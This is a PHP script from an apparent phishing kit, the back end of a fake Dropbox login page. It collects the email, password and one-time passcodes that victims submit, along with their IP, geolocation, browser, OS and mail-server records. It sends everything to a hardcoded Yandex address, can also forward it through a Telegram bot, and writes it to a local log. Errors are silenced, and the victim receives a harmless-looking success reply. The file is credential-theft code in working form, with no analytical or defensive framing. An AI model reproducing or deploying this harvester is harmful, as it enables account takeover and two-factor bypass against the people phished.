<?php
error_reporting(0);
ini_set('display_errors', 0);

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    header('Content-Type: application/json');
    echo json_encode(['status' => 'error', 'message' => 'Method Not Allowed']);
    exit;
}

// ===================================
// HELPER FUNCTIONS
// ===================================
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return $_SERVER['HTTP_X_FORWARDED_FOR'];
    return $_SERVER['REMOTE_ADDR'];
}

function getUserBrowser() {
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    if (strpos($ua, 'MSIE') !== false || strpos($ua, 'Trident') !== false) return 'Internet Explorer';
    if (strpos($ua, 'Edge') !== false) return 'Microsoft Edge';
    if (strpos($ua, 'Firefox') !== false) return 'Mozilla Firefox';
    if (strpos($ua, 'Chrome') !== false) return 'Google Chrome';
    if (strpos($ua, 'Safari') !== false) return 'Safari';
    if (strpos($ua, 'Opera') !== false) return 'Opera';
    return 'Unknown';
}

function getUserOS() {
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    if (strpos($ua,'Windows NT 10.0')!==false) return 'Windows 10';
    if (strpos($ua,'Windows NT 6.3')!==false) return 'Windows 8.1';
    if (strpos($ua,'Windows NT 6.2')!==false) return 'Windows 8';
    if (strpos($ua,'Windows NT 6.1')!==false) return 'Windows 7';
    if (strpos($ua,'Windows NT 6.0')!==false) return 'Windows Vista';
    if (strpos($ua,'Windows NT 5.1')!==false) return 'Windows XP';
    if (strpos($ua,'Windows NT 5.0')!==false) return 'Windows 2000';
    if (strpos($ua,'Macintosh')!==false) return 'Macintosh';
    if (strpos($ua,'Linux')!==false) return 'Linux';
    return 'Unknown';
}

function tg($token, $chatId, $message) {
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = ['chat_id'=>$chatId,'text'=>$message];
    $options = ['http'=>[
        'header'=>"Content-Type: application/x-www-form-urlencoded\r\n",
        'method'=>'POST',
        'content'=>http_build_query($data)
    ]];
    $context = stream_context_create($options);
    $result = file_get_contents($url,false,$context);
    return $result !== false;
}

function getUserAgent() {
    return $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
}

// ===================================
// GEO LOCATION USING geoPlugin
// ===================================
function getUserLocation($ip) {
    $details = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip={$ip}"));
    $countryCode = $details->geoplugin_countryCode ?? 'Unknown';
    $countryName = $details->geoplugin_countryName ?? 'Unknown';
    $city = $details->geoplugin_city ?? 'Unknown';
    $region = $details->geoplugin_regionName ?? 'Unknown';
    return [
        'ip' => $ip,
        'countryCode' => $countryCode,
        'countryName' => $countryName,
        'city' => $city,
        'region' => $region
    ];
}

// ===================================
// MX RECORD FUNCTION
// ===================================
function getMXRecords($email) {
    $domain = substr(strrchr($email, "@"), 1);
    if (!$domain) return ['Invalid domain'];

    $mxRecords = dns_get_record($domain, DNS_MX);
    $mx = [];
    if ($mxRecords && is_array($mxRecords)) {
        foreach ($mxRecords as $rec) {
            if (!empty($rec['target'])) $mx[] = $rec['target'];
        }
    }
    if (empty($mx)) $mx[] = $domain;
    return $mx;
}

// ===================================
// EMAIL / TELEGRAM SETTINGS
// ===================================
$to = 'loggsgood@yandex.com';
$token = '';
$chatId = '';

// ===================================
// POST DATA
// ===================================
$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';
$otp_raw = $_POST['otp'] ?? '';
$otp_joined = $_POST['OTP'] ?? '';

$otp_normalized = '';
if (is_array($otp_raw)) {
    $otp_normalized = implode('', array_filter($otp_raw, fn($v)=>trim($v)!==''));
} else $otp_normalized = $otp_raw;

$otp_final = $otp_normalized ?: $otp_joined;

// ===================================
// USER INFO
// ===================================
$ip = getUserIP();
$os = getUserOS();
$browser = getUserBrowser();
$user_agent = getUserAgent();
$user_location = getUserLocation($ip);
$mx_records = !empty($email) ? getMXRecords($email) : ['Unknown'];

$timestamp = date('l d, F Y (h:i:s A)');
$referrer = $_SERVER['HTTP_REFERER'] ?? 'direct';
$content_type = $_SERVER['CONTENT_TYPE'] ?? 'unknown';

// ===================================
// BUILD MESSAGE
// ===================================
$message = "---------------------------------------\n";
$message .= "DropBox L0gz\n";
$message .= "Username: {$email}\n";
$message .= "Password: {$password}\n";
if (!empty($otp_final) && $otp_final !== ',,,,,') $message .= "OTP: {$otp_final}\n";
$message .= "IP: {$user_location['ip']}\n";
$message .= "Country Code: {$user_location['countryCode']}\n";
$message .= "Country Name: {$user_location['countryName']}\n";
$message .= "City: {$user_location['city']}\n";
$message .= "Region: {$user_location['region']}\n";
$message .= "Browser: {$browser}\n";
$message .= "Operating System: {$os}\n";
$message .= "MX Records: " . implode(', ', $mx_records) . "\n";
$message .= "Date: {$timestamp}\n";
$message .= "---------------------------------------\n";
$message .= "User Agent: {$user_agent}\n\n";

// ===================================
// SEND EMAIL
// ===================================
$headers = [
    'From' => 'Notification <noreply@'.$_SERVER['SERVER_NAME'].'>',
    'Reply-To' => $email,
    'X-Mailer' => 'PHP/'.phpversion(),
    'Content-Type' => 'text/plain; charset=utf-8'
];

$subject = "You got mail from $email - {$ip}";
$em = mail($to,$subject,$message,$headers);

// SEND TELEGRAM
$tg = tg($token,$chatId,$message);

// LOG TO FILE
if ($em || $tg) {
    $data = __DIR__ . '/loggsgood.log';
    file_put_contents($data, $message, FILE_APPEND);
}

// RETURN JSON
header('Content-Type: application/json');
echo json_encode(['status'=>'ok','message'=>'processed']);
exit;
?>